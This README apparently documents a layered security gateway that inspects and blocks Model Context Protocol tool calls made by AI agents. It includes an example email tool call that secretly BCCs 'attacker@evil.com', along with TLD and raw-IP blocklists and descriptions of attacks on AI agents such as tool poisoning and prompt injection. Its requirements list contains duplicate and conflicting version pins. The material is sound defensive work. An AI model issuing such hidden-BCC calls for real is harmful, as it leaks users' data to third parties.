# MCP Security Gateway

**Real-time MCP Tool Call Security Gateway**

## Overview
Production-grade security gateway for Model Context Protocol (MCP) tool calls. Implements 5-layer defense-in-depth with real-time blocking of C2, exfiltration, shadow servers, and kernel-level attacks.

## 5-Layer Defense

| Layer | Component | Threats Blocked |
|-------|-----------|-----------------|
| **L2** | Inline Proxy Gateway | Prompt injection, tag injection, arg manipulation |
| **L3** | Kernel Monitor (eBPF/ETW) | Hidden SMTP, process spawn, unauthorized DNS |
| **L4** | Semantic Intent Analyzer | BCC exfil, shadow servers, encoding evasion |
| **L5** | Network Egress Policy | Suspicious TLDs, raw IPs, oversized payloads |
| **L6** | ML Classifier (BETA) | TF-IDF + LR supplementary signal |

## Real-World Attacks Blocked

| Attack | Reference | Layer |
|--------|-----------|-------|
| Postmark BCC Exfiltration (2024) | OX Security | L4 |
| MCP Tool Poisoning (2026) | OWASP Stockholm | L2 |
| Semantic Exfiltration | Nightfall AI | L4 |
| Cross-Server Shadowing | General Analysis | L4 |
| SkillCloak Obfuscation | arxiv 2607.02357 | L4 |
| MCP-ITP Implicit Poisoning | arxiv 2601.07395 | L2 |

## API

### MCP Endpoint (JSON-RPC 2.0)
```bash
POST /mcp
Content-Type: application/json

{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "email.send",
    "arguments": {
      "to": ["user@company.com"],
      "subject": "Invoice",
      "body": "Payment due",
      "bcc": ["attacker@evil.com"]
    }
  },
  "id": 1
}
```

**Response (Blocked):**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "error": {
    "code": -32603,
    "message": "Blocked by security policy",
    "data": {
      "findings": [
        {"type": "hidden_bcc", "severity": "critical", "description": "Hidden BCC recipient detected"}
      ]
    }
  }
}
```

### Tools List
```bash
POST /mcp
{"jsonrpc": "2.0", "method": "tools/list", "id": 1}
```

### Tool Call (Allowed)
```bash
POST /mcp
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "db.query",
    "arguments": {"sql": "SELECT * FROM users WHERE id=1"}
  },
  "id": 1
}
```

## Detection Rules

### Layer 2: Inline Proxy (`layers/proxy.py`)
- Recursive argument extraction
- Risk scoring (0-100)
- Block threshold: 50, Quarantine: 30

### Layer 4: Semantic Analyzer (`layers/semantic.py`)
- 35+ BCC synonyms (blind_copy, hidden_recipients, etc.)
- Exfiltration intent patterns (8 regex)
- Dangerous field semantics (12 fields)
- Base64/encoding detection
- Multi-field correlation

### Layer 5: Network Egress (`layers/egress.py`)
- Default-deny with explicit allowlist
- Suspicious TLD blocklist (.tk, .ml, .ga, .cf, .gq, .xyz, .top, .buzz, .club)
- Raw IP blocking
- Payload size limits (default 100KB)

### Layer 3: Kernel Monitor
- **Linux (eBPF)**: tracepoints for connect, execve, openat, sendmsg
- **Windows (ETW)**: Microsoft-Windows-Kernel-* providers
- Per-server policy (allowed destinations, ports, paths)

## mTLS Shadow Server Detection

```python
from mcp_monitor.detectors.shadow_server_mtls import MTLSShadowServerDetector, create_mtls_detector

detector = create_mtls_detector(
    ca_cert_path="certs/ca_cert.pem",
    trust_domains=["mlsec.local"],
    require_spiffe=True
)

# Register legitimate server
detector.register_server("mcp-server", open("server_cert.pem").read(), 
                         ["send_email", "query_db", "search_web"])

# Verify incoming connection
verified, reason, attestation = detector.verify_connection("mcp-server", client_cert_pem)
```

## mTLS Configuration

```json
{
  "mtls": {
    "ca_cert": "certs/ca_cert.pem",
    "server_cert": "certs/server_cert.pem",
    "server_key": "certs/server_key.pem",
    "trust_domains": ["mlsec.local"],
    "require_spiffe": true
  }
}
```

## Deployment

```bash
# Development
docker-compose up -d

# Production (with mTLS)
docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d
```

## Monitoring

```prometheus
mcp_gateway_requests_total{product,status}
mcp_gateway_blocked_total{layer,category}
mcp_gateway_latency_seconds{layer}
mcp_gateway_shadow_server_detected_total
```

## Requirements

```
fastapi==0.109.0
uvicorn==0.27.0
httpx==0.27.0
pydantic==2.6.0
pydantic-settings==2.1.0
python-jose==3.3.0
passlib==1.7.4
bcrypt==4.3.0
python-multipart==0.0.6
cryptography==42.0.1
pyyaml==6.0.1
httpx==0.27.0
prometheus-client==0.19.0
psutil==5.9.0
watchdog==4.0.0
cryptography==42.0.0
pyyaml==6.0.1
jose==3.3.0
passlib==1.7.4
bcrypt==4.3.0
python-multipart==0.0.6
httpx==0.27.0
prometheus-client==0.19.0
psutil==5.9.0
watchdog==4.0.0
```

## License

Apache 2.0